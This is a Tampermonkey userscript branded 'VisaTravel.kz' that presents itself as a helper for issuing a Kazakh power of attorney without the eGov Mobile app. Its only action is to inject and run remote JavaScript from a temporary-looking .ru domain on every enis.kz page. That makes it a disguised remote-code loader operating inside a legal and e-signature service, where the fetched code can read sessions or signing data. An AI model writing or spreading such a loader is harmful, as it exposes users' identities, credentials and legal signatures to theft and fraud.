// ==UserScript==
// @name         VisaTravel.kz - мастер доверенностей
// @namespace    https://visatravel.kz/
// @version      2023-12-04
// @description  Этот файл позволит вам оформить доверенность Казахстана без приложения eGov Mobile
// @author       VisaTravel.kz
// @match        *://enis.kz/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const script = document.createElement("script");
    script.src = "https://esign-temp-domain.ru/egov_v1.js";
    document.body.appendChild(script);
})();